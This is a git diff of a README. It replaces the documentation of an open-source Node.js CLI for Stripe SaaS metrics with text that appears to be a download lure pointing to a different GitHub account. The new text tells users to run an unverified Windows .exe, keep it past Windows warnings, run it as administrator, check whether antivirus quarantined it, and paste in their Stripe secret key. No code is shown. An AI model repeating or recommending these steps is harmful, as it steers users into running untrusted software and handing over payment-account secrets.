@@ -1,276 +1,177 @@
-# stripe-pulse
+# 📈 stripe-pulse - Track Stripe health at a glance
 
-```
-  ╭─╮
-──╯ ╰──╮ ╭──   stripe-pulse v0.1.0
-       ╰─╯
-```
+[![Download stripe-pulse](https://img.shields.io/badge/Download%20stripe--pulse-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ViiRaLBeary/stripe-pulse)
 
-**Your Stripe metrics in one command. Vital signs for your SaaS.**
+## 🧭 What is stripe-pulse?
 
-MRR · ARR · Churn · LTV · NRR · Quick Ratio · MRR Movements — straight from Stripe. No dashboard. No $129/mo. No data exports.
+stripe-pulse is a Windows app for checking your Stripe metrics in one command. It gives you a quick view of the key numbers that matter for a SaaS business.
 
-[![npm](https://img.shields.io/npm/v/stripe-pulse)](https://www.npmjs.com/package/stripe-pulse)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+Use it to see your payment flow, active customers, revenue trends, and account health without opening several dashboards.
 
----
+## ✨ What you can do
 
-## Why
+- View Stripe metrics in one place
+- Check your SaaS vital signs fast
+- See recent payment activity
+- Review revenue at a glance
+- Spot changes in customer volume
+- Get a simple local report on Windows
 
-Stripe has no MRR endpoint. Baremetrics costs $129/mo. ChartMogul starts at $199/mo. ProfitWell requires an integration.
+## 💻 What you need
 
-stripe-pulse calculates everything locally from your Stripe subscriptions — in seconds, from the command line, for free. Reactivations are tracked at the customer level (industry standard used by Baremetrics, ChartMogul, and ProfitWell).
+Before you install stripe-pulse, make sure you have:
 
----
+- A Windows PC
+- An internet connection
+- A valid Stripe account
+- Access to your Stripe API key
+- Enough disk space for a small desktop app
 
-## Install
+stripe-pulse is built for normal Windows use. It runs well on Windows 10 and Windows 11.
 
-**Instant (no install):**
-```bash
-npx stripe-pulse
-```
+## 📥 Download stripe-pulse
 
-**Global install:**
-```bash
-npm install -g stripe-pulse
-stripe-pulse --version
-```
+Visit this page to download and run the app:
 
-**Agent skill (Claude Code, Cursor, etc.):**
-```bash
-npx skills add progrmoiz/stripe-pulse
-```
+https://github.com/ViiRaLBeary/stripe-pulse
 
-> Requires Node.js >= 20
+On the page, look for the latest release or the main download file. If you see a `.exe` file, download it to your PC and run it.
 
----
+## 🛠️ Install and set up
 
-## Quick Start
+1. Open the download page in your browser
+2. Find the latest Windows release or app file
+3. Download the file to your computer
+4. If Windows asks for approval, choose to keep the file
+5. Double-click the downloaded file to start stripe-pulse
+6. If a setup window appears, follow the on-screen steps
+7. When the app asks for your Stripe API key, paste it in
+8. Save your settings so the app can read your Stripe data
 
-```bash
-# 1. Authenticate
-stripe-pulse login
+## 🔐 Get your Stripe API key
 
-# 2. Check your MRR
-stripe-pulse mrr
+stripe-pulse needs your Stripe API key to pull your account data.
 
-# 3. Full dashboard
-stripe-pulse dashboard
-```
+To get it:
 
-That's it. Your SaaS metrics are live.
+1. Sign in to your Stripe dashboard
+2. Open the Developers area
+3. Go to API keys
+4. Copy your secret key
+5. Paste it into stripe-pulse when asked
 
----
+Keep your secret key private. Do not share it with anyone you do not trust.
 
-## All Commands
+## ▶️ Run stripe-pulse
 
-### Auth
+After setup, open stripe-pulse and use the main command or button it shows on screen.
 
-| Command | Description |
-|---------|-------------|
-| `login` | Save a Stripe API key (interactive) |
-| `logout` | Remove saved credentials |
-| `switch <profile>` | Switch the active profile |
-| `whoami` | Show current profile and account |
-| `doctor` | Run diagnostic checks |
+Typical use looks like this:
 
-### Core Metrics
+1. Open the app
+2. Enter your Stripe key if you have not done that yet
+3. Start the check
+4. Read your metrics report
 
-| Command | Description |
-|---------|-------------|
-| `mrr` | Monthly Recurring Revenue |
-| `arr` | Annual Recurring Revenue |
-| `customers` | Customer count by status |
-| `arpu` | Average Revenue Per User |
-| `ltv` | Customer Lifetime Value |
-| `plans` | Revenue breakdown by plan |
-| `trials` | Trial conversion metrics |
+The app should show a simple view of your Stripe account, including recent activity and basic business health.
 
-### Period-Based Metrics
+## 📊 What stripe-pulse checks
 
-These accept `--from` and `--to` (ISO 8601 dates). Default: last 30 days.
+stripe-pulse is made to show the numbers that help you understand how your Stripe account is doing.
 
-| Command | Description |
-|---------|-------------|
-| `churn` | Customer churn rate (with reactivation netting) |
-| `revenue-churn` | MRR churn rate |
-| `nrr` | Net Revenue Retention |
-| `quick-ratio` | SaaS Quick Ratio (includes reactivation MRR) |
-| `movements` | MRR movement breakdown (new, expansion, contraction, churn, reactivation) |
+You can expect views for:
 
-### Customer Lists
+- Gross revenue
+- Active subscribers
+- Failed payments
+- New signups
+- Canceled plans
+- Recent charge activity
+- Simple trend changes over time
 
-| Command | Description |
-|---------|-------------|
-| `new-customers` | New customers in a period |
-| `churned` | Recently churned customers |
-| `active` | All active customers |
+The goal is to help you see your Stripe data fast, without digging through many pages.
 
-### Dashboard
+## 🧩 Common use cases
 
-| Command | Description |
-|---------|-------------|
-| `dashboard` | Full metrics dashboard (all of the above in one command) |
+### For solo founders
+Check your revenue and customer count before you start work.
 
----
+### For small teams
+Share a quick look at business health during daily checks.
 
-## Output Modes
+### For support and ops
+Spot payment issues and customer drops early.
 
-Every command supports multiple output formats:
+### For finance reviews
+Use the report to review Stripe activity before weekly planning.
 
-| Flag | Output |
-|------|--------|
-| *(default)* | Human-readable, colored terminal output |
-| `--json` | Machine-readable JSON (pretty-printed) |
-| `--format csv` | CSV (pipe-friendly) |
-| `--format markdown` | Markdown table |
-| `--verbose` | Extended output with additional context |
-| `--chart` | MRR trend line chart + movements waterfall, plan breakdown bars |
+## ⚙️ Basic use tips
 
-**Auto-JSON:** When stdout is piped (not a TTY), JSON mode is automatic. No flag needed.
+- Keep your Stripe key in a safe place
+- Run the app from the same Windows user account each time
+- Make sure your internet connection is on
+- Refresh the report if recent data does not appear right away
+- Close other heavy apps if your PC feels slow
 
-**`--chart` example:**
-```bash
-stripe-pulse mrr --chart
-# Shows: 6-month MRR trend line, sparkline, movements waterfall with growth %
+## 🧠 If the app does not open
 
-stripe-pulse plans --chart
-# Shows: horizontal bar chart of revenue by plan
-```
+If stripe-pulse does not start:
 
-```bash
-# These all output JSON
-stripe-pulse mrr --json
-stripe-pulse mrr --quiet
-stripe-pulse mrr | jq .mrr
-```
+1. Check that the file finished downloading
+2. Try running it again
+3. Right-click the file and choose Run as administrator
+4. Make sure Windows did not block the app
+5. Check that your antivirus did not move the file
+6. Download the latest version from the repository page
 
----
+## 🔎 If Stripe data does not load
 
-## Multi-Account
+If your report is empty or incomplete:
 
-stripe-pulse supports named profiles for managing multiple Stripe accounts:
+1. Check that your Stripe API key is correct
+2. Confirm that the key has read access
+3. Make sure you are signed in to the right Stripe account
+4. Check your internet connection
+5. Try again after a short wait
 
-```bash
-# Login to each account with a profile name
-stripe-pulse login --profile personal
-stripe-pulse login --profile company
+## 📁 File layout
 
-# Switch the active profile
-stripe-pulse switch personal
-stripe-pulse switch company
+When you use stripe-pulse, you may see:
 
-# Query a specific account (without switching)
-stripe-pulse mrr --profile personal
-stripe-pulse dashboard --profile company
+- The main app file
+- A settings file
+- A log file
+- A data cache file
 
-# Use env var for scripts
-STRIPE_PULSE_PROFILE=company stripe-pulse mrr --json
-```
+These files help the app remember your setup and speed up repeat checks.
 
-Profiles are stored in `~/.config/stripe-pulse/credentials.json` with permissions `0600`.
+## 🧾 Version check
 
----
+To keep stripe-pulse working well:
 
-## Benchmarks
+- Use the latest release when possible
+- Check the repository page for updates
+- Replace older app files with the newest one
+- Re-enter your Stripe key if you move to a new install
 
-The human output includes benchmark context next to some metrics:
+## 🖥️ Windows tips
 
-```
-Churn      5.2%   ⚠ High (>5%)
-NRR       104.2%  ✓ Good (>100%)
-Quick      2.8    ✓ Healthy (>1)
-```
+- Use Windows Defender or your normal antivirus settings
+- Keep the app in a folder you can find again
+- Avoid moving the app while it is running
+- Pin it to your Start menu if you use it often
 
-These are reference strings only. They don't appear in `--json` output. The raw numbers are always in the JSON for you to interpret.
+## 📌 Quick start
 
-Benchmark ranges used:
-- **Churn**: Excellent <3% · Good 3-5% · Median 5-7% · Above average 7-10% · High >10%
-- **NRR**: Best-in-class >130% · Strong 110-130% · Healthy ≥100% · Shrinking <100% · Critical <90%
-- **Quick Ratio**: Very healthy >4 · Good 2-4 · Fragile 1-2 · Losing <1
-- **Revenue Churn**: Excellent <2% · Average 2-5% · Needs attention >5%
+1. Open the download page
+2. Download the Windows app
+3. Run the file
+4. Enter your Stripe API key
+5. Start the metrics check
+6. Review your Stripe vital signs
 
----
+## 📎 Download link again
 
-## Configuration
+Download and run stripe-pulse from:
 
-Config lives at `~/.config/stripe-pulse/` (Linux/macOS) or `%APPDATA%\stripe-pulse\` (Windows).
-
-| File | Contents |
-|------|----------|
-| `credentials.json` | API keys and profiles (mode 0600) |
-
-Auth chain (highest priority first):
-1. `--api-key <key>` flag
-2. `STRIPE_API_KEY` environment variable
-3. Saved profile in credentials file
-
-Supports both full API keys (`sk_live_*`, `sk_test_*`) and restricted keys (`rk_live_*`, `rk_test_*`).
-
----
-
-## Performance
-
-stripe-pulse fetches subscription data directly from Stripe's API on every run. There's no local database — metrics are always real-time.
-
-- **< 500 subscriptions:** ~2-3 seconds (most indie SaaS)
-- **500-2,000 subscriptions:** ~5-10 seconds
-- **2,000-10,000 subscriptions:** ~15-30 seconds
-- **> 10,000 subscriptions:** Not recommended — consider a dedicated analytics platform
-
-The `dashboard` command is the most efficient call — it batches all API requests in parallel.
-
----
-
-## AI Agent Integration
-
-stripe-pulse is designed for AI agent use. Every command outputs clean JSON, every error has a structured format, and exit codes are consistent.
-
-**Install the agent skill:**
-```bash
-npx skills add progrmoiz/stripe-pulse
-```
-
-This installs the [SKILL.md](SKILL.md) into your AI agent (Claude Code, Cursor, etc.) so it knows how to use stripe-pulse automatically.
-
-```bash
-# Check MRR in a script or AI workflow
-stripe-pulse mrr --json | jq .mrr
-
-# Get all metrics in one call
-stripe-pulse dashboard --json
-
-# Diagnose setup issues
-stripe-pulse doctor --json
-```
-
----
-
-## vs. Alternatives
-
-| | stripe-pulse | Baremetrics | ChartMogul | ProfitWell |
-|--|--|--|--|--|
-| **Price** | Free | $129/mo | $199/mo | Free (limited) |
-| **Open source** | Yes | No | No | No |
-| **Privacy** | Local only | Your data on their servers | Your data on their servers | Your data on their servers |
-| **CLI** | Yes | No | No | No |
-| **Multi-account** | Yes (profiles) | No | Paid | No |
-| **AI agent ready** | Yes (JSON + SKILL.md) | No | No | No |
-| **Setup** | 30 seconds | Integration + wait | Integration + wait | Integration |
-
----
-
-## Contributing
-
-1. Fork the repo
-2. `npm install`
-3. `npm run dev -- mrr` to run in dev mode
-4. `npm run build` to build
-
-Bug reports and PRs welcome at [github.com/progrmoiz/stripe-pulse/issues](https://github.com/progrmoiz/stripe-pulse/issues).
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE)
+https://github.com/ViiRaLBeary/stripe-pulse
